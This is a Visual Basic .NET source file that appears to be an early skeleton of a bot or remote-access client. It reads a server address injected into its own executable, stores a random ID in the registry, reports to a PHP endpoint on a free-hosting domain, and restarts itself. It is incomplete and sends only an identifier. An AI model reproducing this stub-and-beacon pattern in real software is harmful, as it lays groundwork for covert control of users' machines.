Imports System.IO
Imports System.Net
Imports System.Text
Imports Microsoft.Win32
Module General
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\CWS"

    Sub Comun()
        Try
            If My.Computer.FileSystem.DirectoryExists(DIRCommons) = False Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
        Catch ex As Exception
            AddToLog("[Comun@General]Error: ", ex.Message, True)
        End Try
    End Sub

    Sub AddToLog(ByVal Header As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim Overwrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Registro.log") = True Then
                Overwrite = True
            End If
            Dim LogContent As String = "(" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")"
            If flag = True Then
                LogContent &= "[!!!] " & Header & content
            Else
                LogContent &= Header & content
            End If
            Console.WriteLine(LogContent)
            My.Computer.FileSystem.WriteAllText(DIRCommons & "\Install.log", LogContent & vbCrLf, Overwrite)
        Catch
        End Try
    End Sub
    Function CreateRandomString(ByRef Length As Integer) As String
        Dim str As String = Nothing
        Dim rnd As New Random
        For i As Integer = 0 To Length
            Dim chrInt As Integer = 0
            Do
                chrInt = rnd.Next(30, 122)
                If (chrInt >= 48 And chrInt <= 57) Or (chrInt >= 65 And chrInt <= 90) Or (chrInt >= 97 And chrInt <= 122) Then
                    Exit Do
                End If
            Loop
            str &= Chr(chrInt)
        Next
        Return str
    End Function
End Module
Module Memoria
    Dim RutaBase As String = "Software\\CWS"

    Public Ident As String = CreateRandomString(10)

    Function IsFirstStart() As Boolean
        'verificar si es o no el primer inicio.
        '   como sabremos si es o no el primer inicio
        '   R: comprobando la existencia de que algo este existiendo.
        '       en este caso, una llave nos lo dira
        Try
            'comprobar la existencia de un archivo
            If My.Computer.FileSystem.FileExists(DIRCommons & "\pienso luego existo.txt") Then
                'si existi y existo.
                Return False
            Else
                'no he existido
                Return True
            End If
        Catch ex As Exception
            AddToLog("[IsFirstStart@Memoria]Error: ", ex.Message, True)
        End Try
        Return False
    End Function

    Sub TheFirstStart()
        Try
            LoadInject() 'obtenemos los datos injectados
            My.Computer.FileSystem.WriteAllText(DIRCommons & "\pienso luego existo.txt", "René Descartes", False) 'doy evidencia de mi existencia

            'guardamos datos unicos
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            If regKey Is Nothing Then
                Registry.CurrentUser.CreateSubKey(RutaBase)
            End If
            regKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            regKey.SetValue("HostDomain", HostDomain)
            regKey.SetValue("Ident", Ident)
            regKey.Close()

            ReportMeToTheServer() 'se reporta al server

            Process.Start(Application.ExecutablePath)
            End
        Catch ex As Exception
            AddToLog("[TheFirstStart@Memoria]Error: ", ex.Message, True)
        End Try
    End Sub
    Sub LoadInject()
        Try
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
            Dim stubb As String = Space(LOF(1))
            Dim FileSplit = "|CWS|"
            FileGet(1, stubb)
            FileClose(1)
            Dim opt() As String = Split(stubb, FileSplit)
            HostDomain = opt(1)
        Catch ex As Exception
            AddToLog("[LoadInject@Memoria]Error: ", ex.Message, True)
        End Try
    End Sub

    Sub TheSecondStart()
        Try

            LoadConfig()
            'iniciar el proceso de espera...
            'obtener los datos del reporte anterior
        Catch ex As Exception
            AddToLog("[TheSecondStart@Memoria]Error: ", ex.Message, True)
        End Try
    End Sub
    Sub SaveConfig()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            If regKey Is Nothing Then
                Registry.CurrentUser.CreateSubKey(RutaBase)
            End If
            regKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            regKey.SetValue("Valor", "Datos")
            regKey.Close()
        Catch ex As Exception
            AddToLog("[SaveConfig@Memoria]Error: ", ex.Message, True)
        End Try
    End Sub
    Sub LoadConfig()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            If regKey Is Nothing Then
                Registry.CurrentUser.CreateSubKey(RutaBase)
            End If
            regKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            HostDomain = regKey.GetValue("HostDomain")
            Ident = regKey.GetValue("Ident")
            regKey.Close()
        Catch ex As Exception
            AddToLog("[LoadConfig@Memoria]Error: ", ex.Message, True)
        End Try
    End Sub
End Module
Module Network
    Public HostDomain As String = "https://chemic-jug.000webhostapp.com" 'PARA PRUEBAS

    Sub ReportMeToTheServer()
        Try
            Dim webRequest As WebRequest = WebRequest.Create(HostDomain & "/CWS/ReportIt.php")
            webRequest.Method = "POST"
            Dim content As String = ""
            Dim s As String = "ident=" & Ident & "&log=" & content
            Dim bytes As Byte() = Encoding.UTF8.GetBytes(s)
            webRequest.ContentType = "application/x-www-form-urlencoded"
            webRequest.ContentLength = bytes.Length
            Dim requestStream As Stream = webRequest.GetRequestStream()
            requestStream.Write(bytes, 0, bytes.Length)
            requestStream.Close()
            Dim response As WebResponse = webRequest.GetResponse()
            Console.WriteLine(CType(response, HttpWebResponse).StatusDescription)
            response.Close()
        Catch ex As Exception
            AddToLog("[ReportMeToTheServer@Network]Error: ", ex.Message, True)
        End Try
    End Sub

End Module